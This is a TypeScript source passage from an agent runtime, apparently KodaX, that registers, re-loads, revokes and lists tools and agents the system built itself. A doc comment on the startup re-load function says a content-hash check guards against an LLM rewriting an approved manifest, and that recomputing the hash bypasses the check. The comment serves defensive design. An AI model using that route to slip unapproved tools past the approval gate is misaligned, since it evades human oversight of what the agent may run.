   */
  readonly deferred?: boolean;
}

async function registerActiveArtifact(
  artifact: ConstructionArtifact,
  options: RegisterActiveOptions = {},
): Promise<void> {
  if (artifact.kind === 'tool') {
    return registerActiveToolArtifact(artifact);
  }
  if (artifact.kind === 'agent') {
    return registerActiveAgentArtifact(artifact, options);
  }
  // Exhaustiveness guard. ConstructionArtifact is a closed `tool|agent`
  // discriminated union today; the two branches above cover it. If a
  // future kind is added (e.g. preset/workflow/guardrail) without a
  // matching branch, TypeScript fails compilation here because the
  // residual type is no longer assignable to `never`. Matches the
  // failure-mode parity of `testAgentArtifact`, which already returns
  // an explicit error for unsupported kinds — without this guard,
  // `activate` would persist `status: 'active'` to disk for an artifact
  // never registered in TOOL_REGISTRY / AGENT_REGISTRY (silent drift).
  const _exhaustive: never = artifact;
  throw new Error(
    `registerActiveArtifact: unknown artifact kind '${(_exhaustive as ConstructionArtifact).kind}'`,
  );
}

async function registerActiveToolArtifact(artifact: ToolArtifact): Promise<void> {
  const handler = await loadHandler(
    { name: artifact.name, version: artifact.version, cwd: _options.cwd },
    artifact.content.handler,
    artifact.content.capabilities,
    { timeoutMs: artifact.content.timeoutMs },
  );

  const definition: LocalToolDefinition = {
    name: artifact.name,
    description: artifact.content.description,
    input_schema: artifact.content.inputSchema as KodaXToolDefinition['input_schema'],
    handler,
    // Constructed tools don't yet declare a custom classifier projection.
    // FEATURE_092 v1: fail-closed via the conservative default helper —
    // tool name + truncated JSON. Future artifact schema may add an
    // optional `classifierProjection` template (see v0.7.33.md Q2).
    toClassifierInput: (input) => defaultToClassifierInput(artifact.name, input),
  };

  const existing = _activated.get(activeKey(artifact));
  if (existing) {
    existing();
  }

  const unregister = registerTool(definition, {
    source: {
      kind: 'constructed',
      id: `constructed:${artifact.name}@${artifact.version}`,
      label: artifact.name,
      version: artifact.version,
      manifestPath: manifestPath(artifact),
    },
  });

  _activated.set(activeKey(artifact), unregister);
}

/**
 * FEATURE_089 Phase 3.4 — register an activated agent into the
 * Constructed Agent Resolver so subsequent `resolveConstructedAgent
 * (name)` lookups (and Runner.run consumers that thread the resolver)
 * can find it. Mirrors `registerActiveToolArtifact`'s use of
 * `registerTool`.
 *
 * FEATURE_101 v0.7.31.1: when an `admittedHandle` is supplied
 * (activation path), the resolver attaches invariantBindings + admitted
 * manifest to the runnable Agent so `Runner.run` can dispatch observe /
 * assertTerminal hooks. The hydrate path passes no handle — it re-runs
 * admission below to recover bindings on each rehydrated agent.
 */
async function registerActiveAgentArtifact(
  artifact: AgentArtifact,
  options: RegisterActiveOptions = {},
): Promise<void> {
  const existing = _activated.get(activeKey(artifact));
  if (existing) existing();

  let bindings: readonly import('@kodax/core').InvariantId[] | undefined;
  let admittedManifest: import('@kodax/core').AgentManifest | undefined;
  if (options.admittedHandle) {
    bindings = options.admittedHandle.invariantBindings;
    admittedManifest = options.admittedHandle.manifest;
  } else {
    // Rehydrate path: re-run admission to recover bindings. Cheaper
    // than persisting them (avoids drift between manifest contents and
    // the registered invariant set on disk). If admission fails on
    // rehydrate, we fall back to a trusted-agent registration so the
    // hydrate banner still loads — admission failure here means a
    // previously-admitted manifest no longer admits, which the rehydrate
    // hash check should already have caught.
    const manifest = buildAdmissionManifest({
      name: artifact.name,
      content: artifact.content,
    });
    const verdict = await Runner.admit(manifest, {
      activatedAgents: await buildActivatedAgentsMap(),
      stagedAgents: await buildStagedAgentsMap(artifact.name),
    });
    if (verdict.ok) {
      bindings = verdict.handle.invariantBindings;
      admittedManifest = verdict.handle.manifest;
    }
  }

  const registration =
    bindings && admittedManifest
      ? { bindings, manifest: admittedManifest }
      : {};
  const unregister = registerConstructedAgent(artifact, registration, {
    deferred: options.deferred ?? false,
  });
  _activated.set(activeKey(artifact), unregister);
}

/**
 * Rehydrate every artifact whose `status === 'active'` back into
 * TOOL_REGISTRY. Called once at process startup (REPL boot). Does NOT
 * re-run policy gate — startup is restoring previously-approved state,
 * not asking for fresh approval.
 *
 * Integrity check: each artifact's `contentHash` (recorded at activate
 * time) is recomputed and compared to the persisted value. Mismatches
 * are tampered = skipped with a stderr warning. This catches naive
 * cross-session edits to the manifest JSON (e.g. an LLM rewriting the
 * file via the Write tool without recomputing the hash). Sophisticated
 * attackers who recompute the hash can bypass this — defense scoped to
 * single-user CLI integrity, not multi-tenant supply chain.
 *
 * Legacy artifacts written before contentHash existed are accepted as-is
 * (no hash to compare against) and the missing hash is back-filled on a
 * future activate() — keeps upgrades from breaking previously-approved
 * tools.
 *
 * Returns counts so callers can surface a loaded/failed/tampered banner.
 * Failures are logged (console.warn) and rehydration continues for the
 * remaining artifacts; a single bad manifest must not break boot.
 */
export async function rehydrateActiveArtifacts(): Promise<{
  loaded: number;
  failed: number;
  tampered: number;
}> {
  const all = await loadAllArtifacts(_options.cwd);
  const active = all.filter((a) => a.status === 'active');

  let loaded = 0;
  let failed = 0;
  let tampered = 0;

  for (const artifact of active) {
    if (artifact.contentHash) {
      const recomputed = computeContentHash(artifact.content);
      if (recomputed !== artifact.contentHash) {
        tampered += 1;
        console.warn(
          `[ConstructionRuntime] Refusing to rehydrate ${artifact.name}@${artifact.version}: contentHash mismatch (manifest was edited after activation). Re-stage and re-activate to re-approve.`,
        );
        continue;
      }
    }
    try {
      await registerActiveArtifact(artifact);
      loaded += 1;
    } catch (err) {
      failed += 1;
      console.warn(
        `[ConstructionRuntime] Failed to rehydrate ${artifact.name}@${artifact.version}: ${(err as Error).message}`,
      );
    }
  }

  return { loaded, failed, tampered };
}

/**
 * Revoke an active constructed tool. Removes the registration from
 * TOOL_REGISTRY (the stack falls back to any prior version or builtin)
 * and flips `status` to `'revoked'` on disk. The .js source remains for
 * audit; the artifact JSON remains for history.
 *
 * Idempotent: revoking an unknown name@version is a no-op.
 */
export async function revoke(name: string, version: string): Promise<void> {
  assertSafeIdentifier(name, 'name');
  assertSafeIdentifier(version, 'version');

  const key = `${name}@${version}`;
  const unregister = _activated.get(key);
  if (unregister) {
    unregister();
    _activated.delete(key);
  }

  const artifact = await readArtifactByVersion(name, version);
  if (artifact) {
    // Immutable update — persist a NEW artifact record.
    const revoked: ConstructionArtifact = {
      ...artifact,
      status: 'revoked',
      revokedAt: Date.now(),
    };
    await persistArtifact(revoked);
  }
}

/**
 * List all artifacts on disk, optionally filtered by kind.
 * Returns artifacts of any status (staged / active / revoked); callers
 * that only want active should pipe through `.filter(a => a.status === 'active')`.
 */
export async function list(
  kind?: ConstructionArtifact['kind'],
): Promise<ConstructionArtifact[]> {
  return loadAllArtifacts(_options.cwd, kind);
}

// ============================================================
// Internal helpers
// ============================================================

function manifestPath(artifact: ConstructionArtifact): string {
  return path.resolve(
    _options.cwd,
    CONSTRUCTED_ROOT_SUBPATH,
    `${artifact.kind}s`,
    artifact.name,
    `${artifact.version}.json`,
  );
}

function activeKey(artifact: ConstructionArtifact): string {
  return `${artifact.name}@${artifact.version}`;
}

async function persistArtifact(artifact: ConstructionArtifact): Promise<void> {
  const filePath = manifestPath(artifact);
  await fs.mkdir(path.dirname(filePath), { recursive: true });
  await fs.writeFile(filePath, JSON.stringify(artifact, null, 2), 'utf8');
}

/**
 * Public lookup: read a persisted artifact by name+version. Iterates every
 * supported kind. Returns `undefined` if not found.
 *
 * Used by the `test_tool` / `activate_tool` builtins to round-trip from a
 * caller-supplied identifier back to the on-disk manifest, since the
 * runtime keeps no in-memory artifact cache.
 */
export async function readArtifact(
  name: string,
  version: string,
): Promise<ConstructionArtifact | undefined> {
  assertSafeIdentifier(name, 'name');
  assertSafeIdentifier(version, 'version');
  return readArtifactByVersion(name, version);
}

async function readArtifactByVersion(
  name: string,
  version: string,
): Promise<ConstructionArtifact | undefined> {
  // We don't know the kind a priori; iterate every supported kind.
  for (const kind of SUPPORTED_KINDS) {
    const filePath = path.resolve(
      _options.cwd,
      CONSTRUCTED_ROOT_SUBPATH,
      `${kind}s`,
      name,
      `${version}.json`,
    );
    try {
      const raw = await fs.readFile(filePath, 'utf8');
      return JSON.parse(raw) as ConstructionArtifact;
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') continue;
      throw err;
    }
  }
  return undefined;
}

/**
 * Walk `.kodax/constructed/<kind>s/*` and return all parseable artifacts.
 * Skips files that fail to parse (with a console warning) rather than
 * crashing startup — invariant: a malformed manifest must not break
 * KodaX boot. Tests verify this.
 */
async function loadAllArtifacts(
  cwd: string,
  kindFilter?: ConstructionArtifact['kind'],
): Promise<ConstructionArtifact[]> {
  const root = path.resolve(cwd, CONSTRUCTED_ROOT_SUBPATH);
  const out: ConstructionArtifact[] = [];

  const kinds: ReadonlyArray<ConstructionArtifact['kind']> = kindFilter
    ? [kindFilter]
    : SUPPORTED_KINDS;

  for (const kind of kinds) {
    const kindDir = path.join(root, `${kind}s`);
    let nameDirs: string[];
    try {
      nameDirs = await fs.readdir(kindDir);
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') continue;
      throw err;
    }

    for (const nameDir of nameDirs) {
      const namePath = path.join(kindDir, nameDir);
      let versionFiles: string[];
      try {
        versionFiles = await fs.readdir(namePath);
      } catch {
        continue;
      }
      for (const versionFile of versionFiles) {
        if (!versionFile.endsWith('.json')) continue;
        // Skip per-agent metadata files (FEATURE_090 budget counter at
        // `_self_modify.json`, future `_*.json` siblings). Leading
        // underscore is the convention for "not a versioned manifest"
        // — manifests follow semver-friendly names that cannot start
        // with `_` per `assertSafeIdentifier`.
        if (versionFile.startsWith('_')) continue;
        const filePath = path.join(namePath, versionFile);
        try {
          const raw = await fs.readFile(filePath, 'utf8');
          const parsed = JSON.parse(raw) as ConstructionArtifact;
          // Light shape check; bad manifests are skipped not thrown.
          if (
            typeof parsed.name === 'string'
            && typeof parsed.version === 'string'
            && typeof parsed.kind === 'string'
            && typeof parsed.status === 'string'
          ) {
            out.push(parsed);
          } else {
            console.warn(
              `[ConstructionRuntime] Skipping malformed manifest at ${filePath} — missing required fields.`,
            );
          }
        } catch (err) {
          console.warn(
            `[ConstructionRuntime] Skipping unreadable manifest at ${filePath}: ${(err as Error).message}`,
          );
        }
      }
    }
  }

  return out;
}

// FEATURE_101 v0.7.31.1 — Build the cross-manifest agent maps that
// admission consults for transitive cycle detection.
//
// `buildActivatedAgentsMap`: snapshot of currently-activated constructed
// agents from the resolver registry. Same map shape `Runner.admit`
// expects: name → Agent.
//
// `buildStagedAgentsMap`: scans `.kodax/constructed/agents/` for
// status='staged' manifests and builds stub Agents (name + outgoing
// handoffs only — admission's handoffLegality only walks names + edges).
// `excludeName` skips the manifest currently being audited so it isn't
// double-counted in the adjacency graph.

async function buildActivatedAgentsMap(): Promise<ReadonlyMap<string, CoreAgent>> {
  const map = new Map<string, CoreAgent>();
  for (const agent of listConstructedAgents()) {
    map.set(agent.name, agent);
  }
  return map;
}

async function buildStagedAgentsMap(
  excludeName?: string,
): Promise<ReadonlyMap<string, CoreAgent>> {
  const map = new Map<string, CoreAgent>();
  const all = await loadAllArtifacts(_options.cwd, 'agent');
  for (const artifact of all) {
    if (artifact.status !== 'staged') continue;
    if (artifact.kind !== 'agent') continue;
    if (excludeName && artifact.name === excludeName) continue;
    // Stub agent — name + outgoing handoff targets. Admission's
    // handoffLegality is the only invariant that consults this; it
    // walks name + Handoff[].target.name. No need to lift tools or
    // resolve refs.
    const handoffs = artifact.content.handoffs?.map((h) => {
      const ref = h.target.ref;
      const colon = ref.indexOf(':');
      const tail = colon === -1 ? ref : ref.slice(colon + 1);
      const at = tail.indexOf('@');
      const targetName = at === -1 ? tail : tail.slice(0, at);
      return {
        target: { name: targetName, instructions: '' } as CoreAgent,
        kind: h.kind,
      };
    }) ?? [];
    map.set(artifact.name, {
      name: artifact.name,
      instructions: '',
      handoffs,
    } as CoreAgent);
  }
  return map;
}

// Re-export for downstream modules
export { loadAllArtifacts as _loadAllArtifactsForStartup };

// Surface ConstructionManifestError for callers
export { ConstructionManifestError };
